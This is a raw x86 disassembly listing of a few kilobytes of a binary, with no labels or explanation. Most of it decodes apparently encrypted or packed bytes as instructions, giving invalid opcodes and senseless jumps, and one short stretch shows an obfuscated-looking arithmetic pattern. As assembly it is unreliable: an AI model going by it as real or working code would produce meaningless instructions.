  406578:	sub    DWORD PTR [esi+edx*8+0x39],edx
  40657c:	test   DWORD PTR [ecx+0x6c91cc4e],0x41715837
  406586:	cmp    DWORD PTR [ebp+0x33ec1f03],esp
  40658c:	cmp    DWORD PTR [edx+eax*4+0xa],edi
  406590:	cld    
  406591:	repnz and ebx,ecx
  406594:	push   cs
  406595:	mov    edi,0x42af1dc5
  40659a:	not    BYTE PTR [edi]
  40659c:	cmp    esi,edx
  40659e:	pop    esp
  40659f:	push   edx
  4065a0:	shr    BYTE PTR [edi-0x1d],cl
  4065a3:	(bad)  
  4065a5:	push   esi
  4065a6:	iret   
  4065a7:	cmp    ch,ah
  4065a9:	repnz daa 
  4065ab:	out    dx,eax
  4065ac:	jae    0x406591
  4065ae:	sbb    al,0x2d
  4065b0:	xchg   ecx,eax
  4065b1:	jae    0x406589
  4065b3:	out    dx,al
  4065b4:	ror    DWORD PTR [eax+0x17be009a],1
  4065ba:	loop   0x406629
  4065bc:	(bad)  
  4065bd:	ins    BYTE PTR es:[edi],dx
  4065be:	sub    BYTE PTR [ebx],al
  4065c0:	std    
  4065c1:	or     al,0xed
  4065c3:	rol    esp,cl
  4065c5:	jnp    0x406574
  4065c7:	mov    eax,ds:0x3ec8a783
  4065cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4065cd:	sub    eax,0x53072d3a
  4065d2:	or     eax,0xffffffaa
  4065d5:	(bad)  
  4065d6:	(bad)  
  4065d8:	or     DWORD PTR [ecx-0x2],ebx
  4065db:	mov    esp,0xe41b22c3
  4065e0:	push   edi
  4065e1:	push   cs
  4065e2:	cld    
  4065e3:	xlat   BYTE PTR ds:[ebx]
  4065e4:	mov    ebp,0x29116db0
  4065e9:	popa   
  4065ea:	pop    eax
  4065eb:	xchg   esi,eax
  4065ec:	fs fcmovnbe st,st(6)
  4065ef:	repz xlat BYTE PTR ds:[ebx]
  4065f1:	jo     0x40666e
  4065f3:	jg     0x4065ff
  4065f5:	pop    ds
  4065f6:	imul   ebx,DWORD PTR [edi+0x54],0xfe45415a
  4065fd:	xchg   DWORD PTR [esi],edi
  4065ff:	ret    0xfaab
  406602:	inc    edx
  406603:	mov    eax,ds:0x51f0a311
  406608:	scas   eax,DWORD PTR es:[edi]
  406609:	outs   dx,BYTE PTR ds:[esi]
  40660a:	cmp    DWORD PTR ds:0x68c65fb0,ebp
  406610:	ss cdq 
  406612:	fistp  QWORD PTR [ecx-0x66]
  406615:	ret    
  406616:	hlt    
  406617:	out    0xa7,eax
  406619:	fild   QWORD PTR [eax]
  40661b:	pop    esi
  40661c:	jmp    FWORD PTR [esi-0x6cbaf859]
  406622:	mov    ecx,0xfdf44b5c
  406627:	jmp    0x98a8:0x5959ca4f
  40662e:	aad    0x24
  406630:	mov    ah,0xcc
  406632:	jb     0x4065c5
  406634:	sbb    al,0x8b
  406636:	rdtsc  
  406638:	jle    0x40667a
  40663a:	mov    eax,0xa22a4f6c
  40663f:	ss push ebx
  406641:	xor    BYTE PTR [edi+0x7d2b9ab9],cl
  406647:	add    DWORD PTR [ecx+eiz*8],edi
  40664a:	aas    
  40664b:	push   ebx
  40664c:	jmp    0xd4e324ad
  406651:	xchg   BYTE PTR [edi],bl
  406653:	mov    ch,0xb7
  406655:	popa   
  406656:	rcr    BYTE PTR [eax+0x34014d50],0x86
  40665d:	je     0x406617
  40665f:	mov    edi,0xfd6eadbb
  406664:	xchg   edx,eax
  406665:	cmp    esi,edi
  406667:	dec    eax
  406668:	cmp    DWORD PTR [edi],0xffffffd0
  40666b:	into   
  40666c:	sbb    eax,0x56032f09
  406671:	cmp    DWORD PTR [edx+0x36],esp
  406674:	sbb    esp,DWORD PTR [edx+0x13]
  406677:	sub    al,0x2d
  406679:	adc    BYTE PTR [ecx+0x83bd530],bl
  40667f:	arpl   WORD PTR ss:[edx-0x839c968],di
  406686:	xchg   edi,eax
  406687:	je     0x4066d5
  406689:	cmp    esi,DWORD PTR [ecx]
  40668b:	push   es
  40668c:	mov    ds:0xd23c6e4,al
  406691:	inc    esi
  406692:	xor    DWORD PTR [edi-0x5d7563de],0xdbfe784a
  40669c:	xchg   edx,eax
  40669d:	out    dx,al
  40669e:	adc    eax,0xb0886aef
  4066a3:	cmp    bh,BYTE PTR [eax+0x578efaa6]
  4066a9:	hlt    
  4066aa:	xor    al,0xbc
  4066ac:	dec    ecx
  4066ad:	pushf  
  4066ae:	call   0x4ff2636f
  4066b3:	icebp  
  4066b4:	dec    eax
  4066b5:	mov    esp,0x46d972ef
  4066ba:	adc    ch,cl
  4066bc:	or     ecx,DWORD PTR [ebx-0x53]
  4066bf:	sahf   
  4066c0:	inc    esi
  4066c1:	sub    BYTE PTR ds:0x7423a8d8,bl
  4066c7:	cmp    eax,0x83c31b3f
  4066cc:	xor    dl,BYTE PTR [esi]
  4066ce:	push   ebx
  4066cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066d0:	repz mov ebx,0xe2b80df1
  4066d6:	adc    bh,BYTE PTR [esi+0x5d03288a]
  4066dc:	push   esi
  4066dd:	sar    DWORD PTR [edx-0x77a5c35f],0x26
  4066e4:	out    0xfb,eax
  4066e6:	(bad)  
  4066e8:	pushf  
  4066e9:	xlat   BYTE PTR ds:[ebx]
  4066ea:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4066ec:	pop    ds
  4066ed:	arpl   WORD PTR [edx+0x19],cx
  4066f0:	mov    ds:0x2f26311a,al
  4066f5:	or     eax,0xf2a4a863
  4066fa:	push   edx
  4066fb:	mov    ds,esp
  4066fd:	add    dl,cl
  4066ff:	jl     0x4066f3
  406701:	sbb    bl,BYTE PTR [ecx+eax*1]
  406704:	jge    0x4066a1
  406706:	(bad)  
  406707:	(bad)  
  406708:	xchg   ecx,eax
  406709:	xor    BYTE PTR [edx],0x75
  40670c:	pop    edx
  40670d:	out    0x7,eax
  40670f:	mov    ds:0x7a4bdccb,eax
  406714:	(bad)  
  406715:	xor    ch,BYTE PTR [ebx+0x11ec980d]
  40671b:	addr16 xchg edi,eax
  40671d:	mov    ah,0x94
  40671f:	not    DWORD PTR [ecx-0x1a]
  406722:	mov    ebx,DWORD PTR [ebp-0x25]
  406725:	mov    gs,WORD PTR [esi]
  406727:	hlt    
  406728:	mov    bh,0x4e
  40672a:	(bad)  
  40672b:	lea    edi,[ebx]
  40672d:	lahf   
  40672e:	xor    esi,esi
  406730:	mov    edx,0x404cd326
  406735:	cld    
  406736:	jg     0x406738
  406738:	sbb    BYTE PTR [edi+eax*4-0x639c9348],dh
  40673f:	inc    esi
  406740:	pop    es
  406741:	push   edx
  406742:	sbb    al,0x77
  406744:	std    
  406745:	jb     0x4066e1
  406747:	mov    cl,0x12
  406749:	icebp  
  40674a:	ss jno 0x4066e0
  40674d:	adc    al,0xc2
  40674f:	mov    dl,0xf8
  406751:	cmp    eax,0x3ecd1a07
  406756:	ins    BYTE PTR es:[edi],dx
  406757:	inc    esp
  406758:	dec    DWORD PTR [edi]
  40675a:	add    BYTE PTR [esi+ebx*4+0x5f],al
  40675e:	mov    ds:0xfa458852,al
  406763:	cmp    eax,0x67db1085
  406768:	or     ebx,ecx
  40676a:	mov    BYTE PTR [eax+esi*1-0x3a],0xa3
  40676f:	mov    esi,0x500bb573
  406774:	xchg   esp,eax
  406775:	test   al,0x11
  406777:	(bad)
  40677a:	arpl   WORD PTR [ecx+0x73947ae7],dx
  406780:	pop    eax
  406781:	adc    eax,0xc59a1a10
  406786:	aam    0x6f
  406788:	mov    esi,0xd4177870
  40678d:	ss mov dh,0x13
  406790:	push   ds
  406791:	retf   0x3769
  406794:	in     al,0x9c
  406796:	sbb    esp,DWORD PTR [ebx-0x25]
  406799:	mov    bl,0x17
  40679b:	jmp    0x4067dc
  40679d:	dec    eax
  40679e:	and    DWORD PTR [ecx-0xc],0x4eef084
  4067a5:	pop    edi
  4067a6:	les    ebx,FWORD PTR [eax+0x36b768ce]
  4067ac:	out    dx,eax
  4067ad:	fs or  eax,0x9ac34230
  4067b3:	scas   al,BYTE PTR es:[edi]
  4067b4:	xchg   esp,eax
  4067b5:	pop    edx
  4067b6:	ret    0xe47e
  4067b9:	xchg   DWORD PTR [edx],ecx
  4067bb:	test   al,0xf9
  4067bd:	add    edi,eax
  4067bf:	dec    ecx
  4067c0:	push   ebx
  4067c1:	dec    esp
  4067c2:	sbb    esi,esi
  4067c4:	inc    edx
  4067c5:	push   eax
  4067c6:	test   eax,0x88949c76
  4067cb:	add    DWORD PTR [edi+0x28],esp
  4067ce:	scas   al,BYTE PTR es:[edi]
  4067cf:	mov    dl,0xbe
  4067d1:	adc    al,0x46
  4067d3:	mov    cs,edx
  4067d5:	(bad)  
  4067d6:	aas    
  4067d7:	and    al,0xa4
  4067d9:	iret   
  4067da:	mov    bl,0xff
  4067dc:	mov    ds:0x6330debd,al
  4067e1:	sub    al,BYTE PTR [eax+ecx*2+0x1e]
  4067e5:	and    ebx,DWORD PTR [ecx+0x26e111a3]
  4067eb:	icebp  
  4067ec:	fimul  DWORD PTR [esi+ebx*8]
  4067ef:	push   ebp
  4067f0:	retf   0x28e
  4067f3:	push   cs
  4067f4:	fs mov dh,ch
  4067f7:	xchg   ebx,eax
  4067f8:	xchg   ebp,eax
  4067f9:	inc    ecx
  4067fa:	add    DWORD PTR [bp+di+0x492c],0x72
  406800:	push   ss
  406801:	and    BYTE PTR [ebx],bl
  406803:	xlat   BYTE PTR ds:[ebx]
  406804:	std    
  406805:	ja     0x4067ec
  406807:	les    ecx,FWORD PTR [esi-0x37bd2493]
  40680d:	loope  0x406882
  40680f:	sub    ch,dh
  406811:	sti    
  406812:	(bad)  
  406814:	adc    al,BYTE PTR [edi+esi*2+0x28eaa575]
  40681b:	loop   0x4067b2
  40681d:	in     al,dx
  40681e:	dec    edi
  40681f:	(bad)  
  406820:	sub    DWORD PTR [ecx+ebp*4-0x3],esi
  406824:	(bad)  
  406825:	or     dh,bl
  406827:	iret   
  406828:	mov    ecx,0xfeafbbbd
  40682d:	xchg   esi,eax
  40682e:	rol    DWORD PTR [ebp-0x5d],1
  406831:	xchg   edi,ebx
  406833:	(bad)  
  406834:	loope  0x40689d
  406836:	enter  0x4417,0x6
  40683a:	sub    ecx,DWORD PTR [edi+0x15]
  40683d:	push   ebx
  40683e:	sbb    DWORD PTR [eax+0x66c58488],ecx
  406844:	call   0x6787396c
  406849:	pop    ds
  40684a:	cmp    bl,BYTE PTR [eax+0x7bbe3ba3]
  406850:	dec    ebx
  406851:	fidiv  DWORD PTR ds:0xfded1753
  406857:	fwait
  406858:	shl    DWORD PTR [ebp+0x510d608a],1
  40685e:	sub    DWORD PTR [esi+0x12],eax
  406861:	out    dx,eax
  406862:	fisub  WORD PTR [eax-0x72b93d50]
  406868:	push   ebp
  406869:	and    edx,DWORD PTR [edi+0x54]
  40686c:	call   0xfae1:0x41045cdb
  406873:	xor    al,ch
  406875:	xor    ecx,DWORD PTR [edx]
  406877:	in     al,0xc
  406879:	fadd   QWORD PTR [edx]
  40687b:	les    esi,FWORD PTR [edi]
  40687d:	pop    es
  40687e:	loope  0x406862
  406880:	stos   BYTE PTR es:[di],al
  406882:	int3   
  406883:	sbb    eax,0x68da28a3
  406888:	aaa    
  406889:	rol    DWORD PTR [ebp+0x7a],1
  40688c:	cs popf 
  40688e:	or     ebx,DWORD PTR [ecx]
  406890:	out    dx,eax
  406891:	xchg   ecx,eax
  406892:	xchg   edi,eax
  406893:	xor    eax,0x746fd655
  406898:	mov    edi,0x9d2e9c73
  40689d:	test   BYTE PTR [ebp+esi*4+0x78709a23],cl
  4068a4:	jg     0x4068e7
  4068a6:	sti    
  4068a7:	mov    ds:0x66228fdd,eax
  4068ac:	add    al,0xa
  4068ae:	pop    es
  4068af:	out    dx,al
  4068b0:	pop    ds
  4068b1:	leave  
  4068b2:	repnz aas 
  4068b4:	nop
  4068b5:	xchg   BYTE PTR ss:[edi-0x1d],bl
  4068b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4068ba:	push   eax
  4068bb:	je     0x40688f
  4068bd:	cld    
  4068be:	lock stc 
  4068c0:	fnstenv [ebx+eiz*2]
  4068c3:	sbb    eax,0x7c86ce9e
  4068c8:	sub    eax,DWORD PTR [esp+edi*4-0x38]
  4068cc:	cmp    al,0xa2
  4068ce:	xor    eax,0x4dcf8777
  4068d3:	clc    
  4068d4:	or     DWORD PTR [ebp+0x44],ecx
  4068d7:	int    0xe0
  4068d9:	cmp    edx,DWORD PTR [ebp-0x36]
  4068dc:	jge    0x406955
  4068de:	push   cs
  4068df:	cld    
  4068e0:	xchg   esi,eax
  4068e1:	int    0xc1
  4068e3:	mov    BYTE PTR [ebx],0x32
  4068e6:	int    0x45
  4068e8:	in     al,dx
  4068e9:	sub    al,0x78
  4068eb:	and    al,0xd
  4068ed:	(bad)  
  4068ee:	push   0xaaf59434
  4068f3:	ret    
  4068f4:	inc    esp
  4068f5:	ins    DWORD PTR es:[edi],dx
  4068f6:	add    dh,BYTE PTR [edx-0x51c7b489]
  4068fc:	aaa    
  4068fd:	mov    DWORD PTR [esi-0x5b58ae62],eax
  406903:	js     0x40689c
  406905:	out    dx,eax
  406906:	mov    esi,0xecd7d340
  40690b:	mov    eax,0x61e8a510
  406910:	ins    BYTE PTR es:[edi],dx
  406911:	jg     0x406925
  406913:	test   al,0x4e
  406915:	into   
  406916:	pop    ss
  406917:	shl    ecx,0x1e
  40691a:	mov    ecx,DWORD PTR [ebp-0x14]
  40691d:	xor    eax,edi
  40691f:	xor    edx,edx
  406921:	or     eax,edx
  406923:	mov    cl,BYTE PTR [eax+ecx*1]
  406926:	mov    eax,DWORD PTR [ebp-0x34]
  406929:	or     BYTE PTR [eax],cl
  40692b:	mov    eax,DWORD PTR [ebp-0x10]
  40692e:	mov    ecx,DWORD PTR [ebp-0xc]
  406931:	shrd   eax,ecx,0x2
  406935:	shr    ecx,0x2
  406938:	mov    ecx,DWORD PTR [ebp-0x10]
  40693b:	mov    edx,DWORD PTR [ebp-0xc]
  40693e:	xor    eax,edi
  406940:	shl    ecx,0x1e
  406943:	xor    edx,edx
  406945:	or     eax,edx
  406947:	lea    eax,[ebp+eax*1-0x4]
  40694b:	mov    DWORD PTR [ebp-0x34],eax
  40694e:	mov    eax,DWORD PTR [ebp-0x10]
  406951:	mov    ecx,DWORD PTR [ebp-0xc]
  406954:	shrd   eax,ecx,0x2
  406958:	shr    ecx,0x2
  40695b:	mov    ecx,DWORD PTR [ebp-0x10]
  40695e:	mov    edx,DWORD PTR [ebp-0xc]
  406961:	xor    eax,edi
  406963:	jmp    0x406d41
  406968:	arpl   WORD PTR [eax],di
  40696a:	test   eax,0x2284a205
  40696f:	ss xchg esp,eax
  406971:	scas   al,BYTE PTR es:[edi]
  406972:	addr16 mov esp,0xbc977502
  406978:	test   DWORD PTR [ebx+0x129e1818],edx
  40697e:	sbb    BYTE PTR [eax],bl
  406980:	sbb    DWORD PTR [edx+edx*1-0x21],ebp
  406984:	arpl   cx,si
  406986:	aaa    
  406987:	push   ss
  406988:	clc    
  406989:	jno    0x406921
  40698b:	fsubrp st(6),st
  40698d:	inc    eax
  40698e:	sbb    edx,DWORD PTR [esi]
  406990:	outs   dx,BYTE PTR ds:[esi]
  406991:	xlat   BYTE PTR ds:[ebx]
  406992:	pop    esp
  406993:	inc    esp
  406994:	jge    0x40692a
  406996:	test   dh,0xc9
  406999:	loopne 0x4069f9
  40699b:	test   al,0x54
  40699d:	sub    BYTE PTR [edi],cl
  40699f:	dec    eax
  4069a0:	mov    ds:0xa211368e,al
  4069a5:	xor    eax,0xc215d97c
  4069aa:	(bad)  
  4069ab:	clc    
  4069ac:	int    0x36
  4069ae:	call   0x359d801e
  4069b3:	test   eax,0x4117c20e
  4069b8:	ret    0x2e70
  4069bb:	pop    eax
  4069bc:	sbb    al,0x8c
  4069be:	mov    ecx,DWORD PTR [ecx+0x28]
  4069c1:	sbb    DWORD PTR [eax],0x65
  4069c4:	ins    BYTE PTR es:[edi],dx
  4069c5:	adc    BYTE PTR [eax+0x2dbe0e66],ah
  4069cb:	jecxz  0x40695c
  4069cd:	scas   eax,DWORD PTR es:[edi]
  4069ce:	popa   
  4069cf:	fdivr  st(4),st
  4069d1:	ror    BYTE PTR [eax],0x5c
  4069d4:	cli    
  4069d5:	fisubr WORD PTR [ebx-0x19acbea4]
  4069db:	pushf  
  4069dc:	shl    BYTE PTR [esi-0x1c72571b],0x90
  4069e3:	ja     0x406a21
  4069e5:	jbe    0x4069e6
  4069e7:	or     DWORD PTR [edx+0x6f],edi
  4069ea:	scas   al,BYTE PTR es:[edi]
  4069eb:	call   0x75ab:0xea1da32
  4069f2:	test   eax,0x8d5d8718
  4069f7:	sti    
  4069f8:	add    cl,BYTE PTR [ecx-0x66]
  4069fb:	fst    DWORD PTR [edx-0x73]
  4069fe:	dec    edi
  4069ff:	adc    eax,0x5d076ebe
  406a04:	lods   al,BYTE PTR ds:[esi]
  406a05:	cmp    edi,esi
  406a07:	sar    BYTE PTR [edi+eiz*8-0x5b],cl
  406a0b:	stc    
  406a0c:	or     edi,DWORD PTR [ebx-0x3b]
  406a0f:	mov    WORD PTR [edi-0x2af05e41],fs
  406a15:	xor    eax,0xe8a1f1e9
  406a1a:	shr    DWORD PTR [edi+0x19],cl
  406a1d:	push   ss
  406a1e:	push   eax
  406a1f:	add    eax,DWORD PTR [ebp+0x7e8e1094]
  406a25:	cli    
  406a26:	pushf  
  406a27:	repnz xchg esi,eax
  406a2a:	push   edx
  406a2b:	aas    
  406a2c:	jnp    0x4069af
  406a2e:	imul   ebp,DWORD PTR [eax-0x2e],0xffffffbd
  406a32:	jnp    0x4069e3
  406a34:	stos   DWORD PTR es:[edi],eax
  406a35:	jns    0x406a0b
  406a37:	out    0xf4,al
  406a39:	cmp    DWORD PTR [ebx-0x20f80b07],esi
  406a3f:	and    al,0xb0
  406a41:	sub    ch,BYTE PTR ds:0x3536623
  406a47:	push   esi
  406a48:	or     eax,0xbe58be24
  406a4d:	inc    esi
  406a4e:	ret    0x70fa
  406a51:	out    0x72,eax
  406a53:	loope  0x406a2e
  406a55:	or     al,0x2b
  406a57:	jbe    0x4069f5
  406a59:	scas   al,BYTE PTR es:[edi]
  406a5a:	fistp  DWORD PTR [edi-0x53]
  406a5d:	push   ebp
  406a5e:	sahf   
  406a5f:	fnstsw WORD PTR [ecx-0x37176be3]
  406a65:	sub    DWORD PTR [edi+edi*1],ebp
  406a68:	sub    eax,0x6ed7055b
  406a6d:	popf   
  406a6e:	xchg   edi,eax
  406a6f:	mov    edi,0xfa23066b
  406a74:	out    dx,al
  406a75:	cs add al,0x33
  406a78:	hlt    
  406a79:	adc    ah,BYTE PTR [ebx]
  406a7b:	pop    ds
  406a7c:	xchg   esi,eax
  406a7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406a7f:	sbb    eax,0xb68e8acf
  406a84:	jb     0x406a25
  406a86:	pusha  
  406a87:	sbb    cl,al
  406a89:	mov    ds:0x14137a05,eax
  406a8e:	cmp    BYTE PTR [ecx],ah
  406a90:	retf   
  406a91:	push   ss
  406a92:	daa    
  406a93:	sbb    BYTE PTR [ebx],bh
  406a95:	dec    esp
  406a96:	aaa    
  406a97:	aam    0x70
  406a99:	mov    al,0x39
  406a9b:	fimul  DWORD PTR [edx]
  406a9d:	mov    ecx,0x2ef146c8
  406aa2:	cmp    DWORD PTR [ebp+0x6828bb91],edx
  406aa8:	mov    DWORD PTR [edx+edx*8-0x66bf662a],eax
  406aaf:	or     BYTE PTR [bx],bh
  406ab2:	xchg   DWORD PTR [ebp-0x57],ecx
  406ab5:	jmp    0x291168f9
  406aba:	shr    BYTE PTR [edx-0x5928f59b],cl
  406ac0:	and    eax,0xc06dda0c
  406ac5:	cmp    al,BYTE PTR [eax+0x53d20935]
  406acb:	cdq    
  406acc:	stc    
  406acd:	sbb    BYTE PTR [esi-0x23bbea8],0x3
  406ad4:	or     al,0x2f
  406ad6:	daa    
  406ad7:	xchg   esp,eax
  406ad8:	jno    0x406a69
  406ada:	ret    
  406adb:	adc    eax,0xd4329430
  406ae0:	mov    ebp,0x5a4eb7dc
  406ae5:	cmp    BYTE PTR [ebx-0x7f5e0dcf],dh
  406aeb:	xor    DWORD PTR [edi],ebp
  406aed:	xor    ebp,DWORD PTR [edx-0x2eb228ef]
  406af3:	or     eax,0xb7b4e659
  406af8:	or     DWORD PTR [eax-0x77d9ce75],eax
  406afe:	mov    esi,0x24ef154f
  406b03:	fst    QWORD PTR [edi-0x65c12556]
  406b09:	mov    ah,0xfc
  406b0b:	jo     0x406b58
  406b0d:	add    ecx,DWORD PTR [ebx+esi*2-0x65422409]
  406b14:	or     BYTE PTR [eax+ebp*8+0x7259fd07],ah
  406b1b:	je     0x406b1e
  406b1d:	push   ebx
  406b1e:	cmp    DWORD PTR [eax+0x19],edi
  406b21:	jmp    0x406afc
  406b23:	or     al,0x7d
  406b25:	jecxz  0x406aac
  406b27:	ins    DWORD PTR es:[edi],dx
  406b28:	sub    eax,DWORD PTR [eax]
  406b2a:	mov    bl,0x6f
  406b2c:	into   
  406b2d:	outs   dx,BYTE PTR ds:[esi]
  406b2e:	repz in al,0x9e
  406b31:	inc    ebp
  406b32:	out    dx,al
  406b33:	pop    ebp
  406b34:	add    al,0x9b
  406b36:	fisttp DWORD PTR [ebp-0x28393536]
  406b3c:	mov    eax,0xe3f5bfca
  406b41:	push   eax
  406b42:	or     DWORD PTR [ecx+0x2c48bee9],ebx
  406b48:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b49:	mov    DWORD PTR [edx],ebx
  406b4b:	and    al,0xa9
  406b4d:	in     eax,0xe8
  406b4f:	dec    edi
  406b50:	mov    cs,ebx
  406b52:	xchg   ebx,eax
  406b53:	jno    0x406b8d
  406b55:	adc    DWORD PTR [eax],edi
  406b57:	fadd   DWORD PTR [eax-0x5d661c7c]
  406b5d:	loopne 0x406b13
  406b5f:	ret    0x5b6e
  406b62:	jo     0x406baa
  406b64:	sub    eax,0xf8ac408b
  406b69:	and    ch,dl
  406b6b:	(bad)  
  406b6c:	dec    eax
  406b6d:	pop    ss
  406b6e:	ror    ecx,cl
  406b70:	mov    ds:0x94ce8344,eax
  406b75:	pop    edi
  406b76:	out    dx,al
  406b77:	fistp  WORD PTR [esi+0x42]
  406b7a:	mov    ebx,0x8638accb
  406b7f:	jns    0x406b1b
  406b81:	aad    0xd2
  406b83:	dec    ecx
  406b84:	test   BYTE PTR [ebx],cl
  406b86:	es dec edi
  406b88:	stos   BYTE PTR es:[edi],al
  406b89:	xchg   BYTE PTR [edi+0x6c],ch
  406b8c:	aaa    
  406b8d:	xchg   esp,eax
  406b8e:	adc    cl,BYTE PTR [ebx+0x6d]
  406b91:	imul   ecx,DWORD PTR [eax],0xffffffe8
  406b94:	jp     0x406c10
  406b96:	mov    bl,0xb8
  406b98:	add    bh,BYTE PTR [ebx+ebp*2+0x3a]
  406b9c:	or     cl,BYTE PTR [edx-0x4b60f0e]
  406ba2:	inc    ecx
  406ba3:	and    edx,DWORD PTR [ecx-0x16]
  406ba6:	xchg   al,bh
  406ba8:	std    
  406ba9:	sbb    bh,BYTE PTR [ecx]
  406bab:	inc    eax
  406bac:	es (bad) 
  406baf:	jbe    0x406bd0
  406bb1:	push   eax
  406bb2:	(bad)
  406bb6:	dec    edi
  406bb7:	xchg   BYTE PTR [ebx+0x7b],cl
  406bba:	sub    BYTE PTR ds:0xd14d560f,dh
  406bc0:	pop    eax
  406bc1:	dec    ecx
  406bc2:	mov    al,0x64
  406bc4:	sbb    esi,DWORD PTR [eax]
  406bc6:	xchg   edx,eax
  406bc7:	mov    WORD PTR [esi-0x4bbf17c5],ss
  406bcd:	mov    dh,BYTE PTR [edi]
  406bcf:	push   ebx
  406bd0:	rcl    BYTE PTR [edi+0x2d1e1ece],0xb2
  406bd7:	test   BYTE PTR [ebx-0x6388af2f],0x44
  406bde:	imul   edx,DWORD PTR cs:[ebp-0x5ab8a917],0xffffffb1
  406be6:	fadd   QWORD PTR [edx+0x3e]
  406be9:	(bad)
  406bec:	test   DWORD PTR [ebx],ebx
  406bee:	mov    cl,0x58
  406bf0:	inc    ecx
  406bf1:	or     al,0xc9
  406bf3:	leave  
  406bf4:	xchg   ebx,eax
  406bf5:	mov    ebp,0xc8f37c8c
  406bfa:	call   0xcc2b1d61
  406bff:	outs   dx,DWORD PTR ds:[esi]
  406c00:	imul   esp,DWORD PTR [ecx+eax*4],0x9ff5c3
  406c07:	pop    edx
  406c08:	inc    ebx
  406c09:	jg     0x406c1c
  406c0b:	fstp   TBYTE PTR [edi+0x7f]
  406c0e:	les    eax,FWORD PTR [eax+0x39]
  406c11:	in     al,0xdd
  406c13:	fdivr  DWORD PTR [eax-0x4f]
  406c16:	pushf  
  406c17:	scas   al,BYTE PTR es:[edi]
  406c18:	sub    al,0xff
  406c1b:	cmc    
  406c1c:	stos   BYTE PTR es:[edi],al
  406c1d:	mov    dl,0x8a
  406c1f:	inc    edi
  406c20:	xchg   esp,eax
  406c21:	clc    
  406c22:	jle    0x406c23
  406c24:	call   0x249:0xccc6b6ae
  406c2b:	test   eax,0x5cda5845
  406c30:	les    ecx,FWORD PTR [ecx]
  406c32:	mov    BYTE PTR [esi],bl
  406c34:	test   BYTE PTR [edx],0xda
  406c37:	mov    eax,0xa15c0819
  406c3c:	sub    bl,0xdf
  406c3f:	cmp    dh,BYTE PTR [edi]
  406c41:	ror    DWORD PTR [ecx+0x3c5f8005],cl
  406c47:	inc    eax
  406c48:	bound  ebp,QWORD PTR [eax]
  406c4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406c4b:	cmp    edx,DWORD PTR [ecx-0x54]
  406c4e:	call   DWORD PTR [eax-0x3e8722cd]
  406c54:	cs in  al,dx
  406c56:	dec    ebx
  406c57:	sbb    esi,esi
  406c59:	outs   dx,BYTE PTR ds:[esi]
  406c5a:	in     eax,dx
  406c5b:	cmp    DWORD PTR [eax+edi*2-0x44],eax
  406c5f:	jb     0x406c56
  406c61:	sbb    eax,0x56126cb2
  406c66:	mov    BYTE PTR [ecx-0x7],dh
  406c69:	not    ebx
  406c6b:	inc    ebp
  406c6c:	ja     0x406cdd
  406c6e:	sbb    esp,ebx
  406c70:	sub    dl,BYTE PTR [ecx-0x6]
  406c73:	cdq    
  406c74:	or     al,0xd6
  406c76:	into   
  406c77:	pop    esi
  406c78:	and    BYTE PTR [ebx],bh
  406c7a:	push   cs
  406c7b:	(bad)  
  406c7c:	daa    
  406c7d:	mov    esi,0x21db42d6
  406c82:	scas   al,BYTE PTR es:[edi]
  406c83:	xor    DWORD PTR [edx+0x3a2cbd2e],eax
  406c89:	pop    DWORD PTR [edi+0x7a]
  406c8c:	ds or  ch,bh
  406c8f:	or     edi,eax
  406c91:	les    ecx,FWORD PTR ds:0xafff4d5
  406c97:	leave  
  406c98:	pop    edi
  406c99:	popf   
  406c9a:	cmp    eax,0x8b677dd7
  406c9f:	xor    esp,0xf6b274cc
  406ca5:	cmp    al,0x88
  406ca7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406ca8:	jl     0x406c7a
  406caa:	leave  
  406cab:	mov    dl,0x95
  406cad:	inc    cx
  406caf:	cmp    eax,0xd4e833e9
  406cb4:	data16 aaa 
  406cb6:	aas    
  406cb7:	or     DWORD PTR [ebx-0x6],ebp
  406cba:	jecxz  0x406cb1
  406cbc:	push   ebp
  406cbd:	les    edi,FWORD PTR [ebx-0x41]
  406cc0:	(bad)  
  406cc1:	mul    DWORD PTR [ecx+0x9]
  406cc4:	popf   
  406cc5:	add    bl,bh
  406cc7:	rcl    DWORD PTR ds:0x7672ad29,1
  406ccd:	lahf   
  406cce:	adc    al,0xfe
  406cd0:	cdq    
  406cd1:	mov    bl,cl
  406cd3:	push   esi
  406cd4:	jno    0x406d1e
  406cd6:	(bad)  
  406cd7:	out    0x15,eax
  406cd9:	scas   al,BYTE PTR es:[edi]
  406cda:	hlt    
  406cdb:	pop    esp
  406cdc:	xchg   edi,eax
  406cdd:	call   0xed9:0x4bf10356
  406ce4:	iret   
  406ce5:	sub    eax,0x414af86e
  406cea:	mov    BYTE PTR [ebx],bh
  406cec:	in     al,0x43
  406cee:	loopne 0x406d35
  406cf0:	jne    0x406d21
  406cf2:	scas   al,BYTE PTR es:[edi]
  406cf3:	out    0x1,eax
  406cf5:	retf   
  406cf6:	fist   DWORD PTR [esi-0x5f0fb07e]
  406cfc:	pop    eax
  406cfd:	dec    eax
  406cfe:	imul   ebp,DWORD PTR [edx],0xffffffef
  406d01:	cdq    
  406d02:	rcr    ecx,1
  406d04:	sti    
  406d05:	sbb    DWORD PTR [edx-0x56],0x75
  406d09:	inc    esp
  406d0a:	pop    edx
  406d0b:	hlt    
  406d0c:	dec    ebx
  406d0d:	retf   0xe67a
  406d10:	or     edx,edx
  406d12:	lods   eax,DWORD PTR ds:[esi]
  406d13:	inc    esi
  406d14:	cdq    
  406d15:	jno    0x406d7c
  406d17:	mov    ds:0xa8c8009e,eax
  406d1c:	or     eax,0x566d15fe
  406d21:	lods   al,BYTE PTR ds:[esi]
  406d22:	pop    eax
  406d23:	leave  
  406d24:	xor    ebp,ebp
  406d26:	jnp    0x406d5e
  406d28:	and    al,0x16
  406d2a:	dec    edi
  406d2b:	call   0x55334a54
  406d30:	add    al,0xe3
  406d32:	int3   
  406d33:	jae    0x406d06
  406d35:	dec    eax
  406d36:	dec    ecx
  406d37:	data16 arpl ax,di
  406d3a:	cmp    ecx,DWORD PTR [ecx-0x113d6ff6]
  406d40:	retf   0xe1c1
  406d43:	push   ds
